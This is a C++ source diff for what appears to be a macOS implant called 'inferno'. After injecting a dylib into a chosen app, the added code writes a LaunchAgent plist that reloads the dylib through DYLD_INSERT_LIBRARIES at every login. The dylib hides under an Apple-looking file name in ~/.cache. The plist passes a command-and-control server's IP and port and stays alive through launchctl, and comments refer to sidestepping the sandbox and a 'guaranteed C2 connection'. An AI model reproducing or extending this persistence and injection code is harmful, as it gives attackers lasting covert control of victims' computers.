@@ -474,6 +474,84 @@ int main(int argc, char* argv[]) {
         std::fprintf(stdout, "[Wrapper] Tier 2: attempting injection into %s\n",
                      best.path.c_str());
         inferno::tier2::injectIntoTarget(best, dylib_path, ip, port);
+
+        // Step 2b-1: Create launchd plist for reboot survival.
+        // The wrapper runs unsandboxed, so it can write to ~/Library/LaunchAgents/.
+        // Inside the target app, sandboxing would silently block this write.
+        const char* home = ::getenv("HOME");
+        if (home) {
+            std::string plist_dir = std::string(home) + "/Library/LaunchAgents";
+            std::string plist_path = plist_dir + "/com.inferno.agent.plist";
+            std::string persist_dylib = std::string(home)
+                + "/.cache/com.apple.amp.itmstransporter.dylib";
+
+            ::mkdir(plist_dir.c_str(), 0755);
+            ::remove(plist_path.c_str());
+
+            mode_t old_mask = ::umask(022);
+            FILE* f = ::fopen(plist_path.c_str(), "w");
+            ::umask(old_mask);
+            if (f) {
+                ::chmod(plist_path.c_str(), 0644);
+                std::fprintf(f, R"(<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.inferno.agent</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>%s</string>
+    </array>
+    <key>EnvironmentVariables</key>
+    <dict>
+        <key>DYLD_INSERT_LIBRARIES</key>
+        <string>%s</string>
+        <key>INFERNO_SERVER_IP</key>
+        <string>%s</string>
+        <key>INFERNO_SERVER_PORT</key>
+        <string>%d</string>
+    </dict>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+</dict>
+</plist>
+)", best.executable_path.c_str(), persist_dylib.c_str(),
+   ip.c_str(), port);
+                ::fclose(f);
+                std::fprintf(stdout, "[Wrapper] Persistence plist created for %s\n",
+                             best.executable_path.c_str());
+
+                // Load into launchd (unload first in case a stale service
+                // from a previous shim persists in the current session).
+                pid_t lp = ::fork();
+                if (lp == 0) {
+                    ::execlp("launchctl", "launchctl", "unload",
+                             plist_path.c_str(), nullptr);
+                    ::_exit(0); // ignore failure — may not be loaded
+                }
+                if (lp > 0) {
+                    int ws;
+                    ::waitpid(lp, &ws, 0);
+                }
+                lp = ::fork();
+                if (lp == 0) {
+                    ::execlp("launchctl", "launchctl", "load",
+                             plist_path.c_str(), nullptr);
+                    ::_exit(1);
+                }
+                if (lp > 0) {
+                    int ws;
+                    ::waitpid(lp, &ws, 0);
+                }
+            } else {
+                std::fprintf(stderr, "[Wrapper] Warning: cannot write plist to %s\n",
+                             plist_path.c_str());
+            }
+        }
     }
 
     // Step 2c: Always launch Tier 1 (shim) — guaranteed C2 connection
